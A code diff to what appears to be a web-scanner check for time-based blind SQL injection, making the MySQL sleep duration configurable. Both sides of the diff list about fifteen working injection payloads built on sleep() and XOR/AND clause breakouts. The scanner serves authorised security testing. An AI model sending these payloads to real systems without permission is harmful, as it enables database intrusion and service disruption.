@@ -13,26 +13,35 @@ source: |+
   * @author slicingmelon
   **/
 
-  var payloads = java.util.List.of(
-    "'XOR(if(isnull(nullif(now(),sysdate())),sleep(20),0))XOR'Z",
-    "'(select(1)from(select(sleep(20)))a)'",
-    "(select(1)from(select(sleep(20)))a)",
-    "(select(1)from(select(sleep(20)))a)-- z",
-    "-(select(1)from(select(sleep(20)))a)",
-    ",(select(1)from(select(sleep(20)))a)",
-    ",(select(1)from(select(sleep(20)))a)-- z",
-    "'AND(select(1)from(select(sleep(20)))a)AND'Z",
-    " AND (select(1)from(select(sleep(20)))a)-- z",
-    "' AND (select(1)from(select(sleep(20)))a)-- z",
-    ") AND (select(1)from(select(sleep(20)))a)-- z",
-    "') AND (select(1)from(select(sleep(20)))a)-- z",
-    "->test\"',(select(1)from(select(sleep(20)))a)-- z\"'",
-    "->test\"' ASC, (select(1)from(select(sleep(20)))a)) DESC-- z\"'",
-    "->test\"') XOR (select(1)from(select(sleep(20)))a)-- z\"'"
+  // Configurable sleep time (in seconds)
+  var DEFAULT_SLEEP_TIME = 20;
+  var SLEEP_PLACEHOLDER = "§§§SLEEP_TIME§§§";
+  
+  var payloadTemplates = java.util.List.of(
+    "'XOR(if(isnull(nullif(now(),sysdate())),sleep(§§§SLEEP_TIME§§§),0))XOR'Z",
+    "'(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)'",
+    "(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)",
+    "(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z",
+    "-(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)",
+    ",(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)",
+    ",(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z",
+    "'AND(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)AND'Z",
+    " AND (select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z",
+    "' AND (select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z",
+    ") AND (select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z",
+    "') AND (select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z",
+    "->test\"',(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z\"'",
+    "->test\"' ASC, (select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)) DESC-- z\"'",
+    "->test\"') XOR (select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z\"'"
   );
+  
+  // Build actual payloads by replacing placeholder with sleep time
+  var payloads = payloadTemplates.stream()
+    .map(p -> p.replace(SLEEP_PLACEHOLDER, String.valueOf(DEFAULT_SLEEP_TIME)))
+    .toList();
 
   var bypassCache = true;
-  var detectionThresholdMs = 20000L;
+  var detectionThresholdMs = DEFAULT_SLEEP_TIME * 1000L;
 
   var detectionFound = false;
 
